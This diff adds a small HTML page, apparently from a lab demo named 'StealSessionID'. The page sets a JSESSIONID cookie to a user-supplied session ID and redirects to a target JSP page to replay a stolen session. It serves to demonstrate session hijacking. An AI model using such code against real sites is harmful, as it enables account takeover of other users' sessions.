@@ -1,0 +1,24 @@
+
+<html>
+
+<head>
+<script type="text/javascript">
+function go()
+{
+	var sessionID = document.getElementById("sessionID").value;
+	var ipAddress = document.getElementById("ip").value;
+	document.cookie = "JSESSIONID=" + sessionID; //Fake the session ID cookie value
+        alert(document.cookie);
+	window.location.href = "http://" + ipAddress + ":8080/StealSessionID/mainpage.jsp";
+}
+</script>
+</head>
+
+<body>
+    <h2>Use Session ID to Access Site</h2>
+    IP Address: <input type="text" id="ip" value="localhost"><br/>
+    Session ID: <input type="text" id="sessionID" value="">
+    <input type="button" value="Go" onclick="go()">
+</body>
+
+</html>
